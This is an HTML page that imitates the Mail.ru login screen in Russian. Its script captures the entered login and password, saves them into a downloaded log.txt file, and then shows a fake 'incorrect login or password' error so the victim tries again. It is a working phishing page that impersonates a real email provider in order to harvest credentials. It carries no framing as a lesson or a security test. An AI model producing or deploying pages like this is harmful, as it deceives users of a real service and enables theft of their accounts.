<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Вход - Mail.ru</title>
    <style>
        body { background: #f5f5f5; font-family: Arial; }
        .box { width: 360px; margin: 100px auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px #ccc; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #0054a0; color: white; border: none; border-radius: 5px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Вход в почту</h2>
        <input type="text" id="login" placeholder="Логин или email">
        <input type="password" id="password" placeholder="Пароль">
        <button onclick="send()">Войти</button>
        <p style="color:red;font-size:12px;" id="msg"></p>
    </div>
    <script>
        function send() {
            var login = document.getElementById('login').value;
            var pass = document.getElementById('password').value;
            if (login && pass) {
                var data = 'Логин: ' + login + ' | Пароль: ' + pass + '\n';
                var blob = new Blob([data], {type: 'text/plain'});
                var a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'log.txt';
                a.click();
                document.getElementById('msg').innerHTML = 'Неверный логин или пароль. Попробуйте снова.';
                document.getElementById('login').value = '';
                document.getElementById('password').value = '';
            }
        }
    </script>
</body>
</html>
